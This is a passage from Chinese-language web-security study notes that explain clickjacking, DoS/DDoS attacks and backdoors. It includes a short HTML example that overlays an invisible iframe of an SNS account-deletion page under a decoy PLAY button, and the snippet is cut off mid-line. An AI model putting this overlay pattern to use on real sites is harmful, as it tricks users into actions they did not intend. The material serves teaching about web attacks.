<p>考虑到加密算法本身可能存在的漏洞，利用该漏洞尝试解密也是 一种可行的方法。但是要找到那些已广泛使用的加密算法的漏 洞，又谈何容易，因此困难极大，不易成功。</p>
<p>而 Web 应用开发者独立实现的加密算法，想必尚未经过充分的 验证，还是很有可能存在漏洞的。</p>
<p><strong>点击劫持</strong></p>
<p>点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖 在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接 访问内容的一种攻击手段。这种行为又称为界面伪装（UI Redressing）。</p>
<p>已设置陷阱的 Web 页面，表面上内容并无不妥，但早已埋入想让用 户点击的链接。当用户点击到透明的按钮时，实际上是点击了已指定 透明属性元素的 iframe 页面。</p>
<ul>
<li>点击劫持的攻击案例</li>
</ul>
<p>下面以 SNS 网站的注销功能为例，讲解点击劫持攻击。利用该 注销功能，注册登录的 SNS 用户只需点击注销按钮，就可以从 SNS 网站上注销自己的会员身份。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808160037519.png" alt="image-20220808160037519"></p>
<p>图：点击劫持</p>
<p>攻击者在预料用户会点击的 Web 页面上设下陷阱。上图中钓鱼 游戏页面上的 PLAY 按钮就是这类陷阱的实例。</p>
<p>在做过手脚的 Web 页面上，目标的 SNS 注销功能页面将作为透 明层覆盖在游戏网页上。覆盖时，要保证 PLAY 按钮与注销按钮 的页面所在位置保持一致。</p>
<blockquote>
<p>iframe 页面中使用透明可点击按钮的示例</p>
</blockquote>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;iframe id="target" src="http://sns.example.jp/leave" style="opacity:0;filter:alpha(opacity=0)">&lt;/iframe>
&lt;button style="position:absolute;top:100;left:100;z-index:-1">PL
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>由于 SNS 网站作为透明层被覆盖，SNS 网站上处于登录状态的 用户访问这个钓鱼网站并点击页面上的 PLAY 按钮之后，等同于 点击了 SNS 网站的注销按钮。</p>
<h4 id="dos-攻击" tabindex="-1"><a class="header-anchor" href="#dos-攻击" aria-hidden="true">#</a> DoS 攻击</h4>
<p>DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状 态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对 象不仅限于 Web 网站，还包括网络设备及服务器等。</p>
<p>主要有以下两种 DoS 攻击方式。</p>
<ul>
<li>集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态。</li>
<li>通过攻击安全漏洞使服务停止。</li>
</ul>
<p>其中，集中利用访问请求的 DoS 攻击，单纯来讲就是发送大量的合 法请求。服务器很难分辨何为正常请求，何为攻击请求，因此很难防 止 DoS 攻击。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808161836981.png" alt="image-20220808161836981"></p>
<p>图：DoS 攻击</p>
<p>多台计算机发起的 DoS 攻击称为 DDoS 攻击（Distributed Denial of Service attack）。DDoS 攻击通常利用那些感染病毒的计算机作为攻 击者的攻击跳板。</p>
<h4 id="后门程序" tabindex="-1"><a class="header-anchor" href="#后门程序" aria-hidden="true">#</a> 后门程序</h4>
<p>后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使 用受限功能。利用后门程序就能够使用原本受限制的功能。</p>
<p>通常的后门程序分为以下 3 种类型。</p>
<ul>
<li>开发阶段作为 Debug 调用的后门程序</li>
<li>开发者为了自身利益植入的后门程序</li>
<li>攻击者通过某种方法设置的后门程序</li>
</ul>
<p>可通过监视进程和通信的状态发现被植入的后门程序。但设定在 Web 应用中的后门程序，由于和正常使用时区别不大，通常很难发现。</p>
</div></template>


